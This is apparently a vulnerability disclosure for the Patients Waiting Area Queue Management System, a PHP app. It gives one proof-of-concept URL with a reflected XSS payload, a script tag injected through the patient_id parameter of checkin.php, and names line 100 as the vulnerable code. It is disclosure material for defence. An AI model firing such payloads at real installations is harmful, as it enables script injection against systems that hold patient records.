### Patients Waiting Area Queue Management System - XSS

### Date: 2026-01/28
### Exploit Author: xiahao@webray.com.cn
### Vendor Homepage: https://www.sourcecodester.com
### Software Link: https://www.sourcecodester.com/php/18348/patients-waiting-area-queue-management-system.html
### Tested on: MacOs13.5 + phpstudy

# /checkin.php（XSS）

### Sample request POC #1

```
http://localhost:8887/checkin.php?patient_id=%22%3E%3Cscript%3Ealert(1)%3C/script%3E%3C
```

![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260128-113414.png "Patients Waiting Area Queue Management System")

### Vulnerability code
checkin.php:100
![blockchain](https://github.com/xiahao90/CVEproject/blob/main/imgs/20260128-113357.png "Patients Waiting Area Queue Management System")
